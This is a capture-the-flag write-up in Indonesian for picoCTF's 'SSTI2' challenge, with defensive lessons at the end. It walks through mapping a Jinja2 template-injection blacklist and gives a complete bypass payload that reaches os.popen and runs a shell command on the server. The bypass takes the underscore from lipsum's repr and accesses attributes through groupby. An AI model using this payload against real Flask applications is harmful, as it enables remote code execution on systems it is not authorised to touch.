# SSTI2

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF 2025 |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Medium |
| Status | Solved |

## Deskripsi

Challenge ini merupakan kelanjutan dari SSTI1 dengan website pengumuman yang sama.
Perbedaannya, server kali ini memasang filter yang membatasi karakter dan kata tertentu
sebelum input dirender sebagai template Jinja2.

## Informasi Awal

Instance dapat diakses melalui:

```text
http://shape-facility.picoctf.net:59192/
```

Halaman utama menampilkan form `What do you want to announce:` yang hasilnya dirender
di endpoint `/announce` (redirect 307, perlu mengikuti redirect).

## Tools

- curl (pengujian payload berulang)
- Browser

## Analisis

### Konfirmasi SSTI

Ekspresi `{{7*7}}` dirender sebagai `49`, dan `{{config}}` menampilkan seluruh isi
konfigurasi Flask. Ini membuktikan SSTI Jinja2 (Werkzeug/3.0.3, Python 3.8.10).

### Pemetaan filter

Pengujian payload kecil satu per satu menghasilkan peta filter berikut:

| Payload | Hasil | Kesimpulan |
| --- | --- | --- |
| `{{7*7}}` | `49` | `{{ }}` lolos |
| `{{'a_b'}}` | `ab` | karakter `_` dihapus dari input |
| `{{'a'.upper()}}` | `Stop trying to break me >:(` | `.` diblokir (pesan blok) |
| `{{config['DEBUG']}}` | `Stop trying to break me >:(` | `[` `]` diblokir |
| `{{'a'~'b'}}` | `ab` | concat `~` aman |
| `{{'attr'}}` | `attr` | kata `attr` aman |
| `{{lipsum|attr('name')}}` | halaman kosong | filter `attr` dinonaktifkan (distanom) |
| `{{'attribute'}}` | `attribute` | kata tidak diblok, tapi filter `map('attribute',...)` tidak ada (500) |
| `{{range(3)|list}}` | `[0, 1, 2]` | pemanggilan fungsi `()` aman |
| `{{'ab'|map('upper')}}` | generator object | filter `map` hidup untuk nama filter bawaan |

Ringkasan blacklist: karakter `.`, `_`, `[`, `]`, dan filter `attr`. `{{config}}` juga
membocorkan repr config yang berisi karakter `_`.

### Rencana bypass

Tiga masalah harus dipecahkan terpisah:

1. Karakter `_` tidak bisa diketik → curi dari repr objek bawaan. Fungsi `lipsum`
   dirender sebagai `<function generate_lorem_ipsum at 0x...>`; karakter `_` pertama
   ada di indeks 18. Slice tanpa bracket memakai filter `batch`:
   `|batch(19)|first|last` memberi elemen indeks 18 (batch pertama berisi indeks 0–18).
2. Akses atribut tanpa titik/bracket/attr → filter `sort(attribute=...)` dan
   `groupby(attribute=...)` menerima nama atribut sebagai string, dan nama string boleh
   dirakit dengan concat `u~u~'globals'~u~u`.
3. Ambil nilai dict tanpa `[` `]` → hasil `groupby` adalah tuple `(grouper, list)`, dan
   `|list|first` memberikan dict `__globals__` (49 kunci). Pasangan kunci-nilai diekstrak
   dengan `|dictsort` dan `{% if k == 'os' %}`.

## Langkah Penyelesaian

### 1. Mencuri karakter underscore

Nama fungsi `lipsum` adalah `generate_lorem_ipsum`; `_` pertamanya berada di indeks 18:

```jinja2
{% set u = (lipsum|string|list|batch(19)|first|last) %}{{u~u~u~u}}
```

Output:

```text
____
```

### 2. Membuka `__globals__` lewat `groupby(attribute=...)`

```jinja2
{% set u = (lipsum|string|list|batch(19)|first|last) %}
{% set g = (lipsum,)|groupby(attribute=u~u~'globals'~u~u)|first %}
{{g|list|first|dictsort|length}}
```

Output `49` mengonfirmasi dict `__globals__` (49 kunci) berhasil diakses. Iterasi kuncinya
menunjukkan `os` tersedia di dalamnya.

### 3. Ekstrak modul `os` dan jalankan perintah

Payload final RCE — mengambil `os` dari `dictsort`, lalu `popen` dan `read` lewat
`groupby(attribute=...)` (masing-masing mengembalikan tuple yang elemen pertamanya fungsi
yang bisa dipanggil dengan kurung biasa):

```jinja2
{% set u = (lipsum|string|list|batch(19)|first|last) %}
{% set g = (lipsum,)|groupby(attribute=u~u~'globals'~u~u)|first %}
{% set d = g|list|first %}
{% for k,v in d|dictsort %}
  {% if k == 'os' %}
    {% set pf = ((v,)|groupby(attribute='popen')|first)|list|first %}
    {% set rd = (((pf('cat flag'),)|groupby(attribute='read')|first)|list|first) %}
    {{rd()}}
  {% endif %}
{% endfor %}
```

(Whitespace hanya untuk keterbacaan; payload asli ditulis satu baris.)

Output yang ditampilkan aplikasi:

```text
picoCTF{sst1_f1lt3r_byp4ss_afa6aa72}
```

## Flag

```text
picoCTF{sst1_f1lt3r_byp4ss_afa6aa72}
```

## Pembelajaran

- Filter karakter tunggal (`_`, `.`, `[`) dapat dibypass dengan mengambil karakter dari
  data yang sudah ada di server, misalnya repr fungsi bawaan Jinja (`lipsum|string`).
- Filter `sort(attribute=...)` dan `groupby(attribute=...)` adalah jalur akses atribut
  lewat string ketika `attr` dinonaktifkan dan titik dilarang.
- Iterasi `{% for %}` atas dict dan tuple menggantikan subscript `[...]` yang diblokir;
  `groupby` mengembalikan tuple yang elemennya bisa diambil dengan `|list|first`.
- Encoder (URL-encode) tidak membantu melawan filter semacam ini: framework melakukan
  decoding sebelum filter memeriksa input.
- Pembelajaran defensif: jangan merender input pengguna sebagai template. Jika terpaksa,
  gunakan sandbox Jinja2 dan jangan menonaktifkan mekanisme keamanan secara selembaga —
  filter berbasis blacklist hampir selalu bisa dilewati.
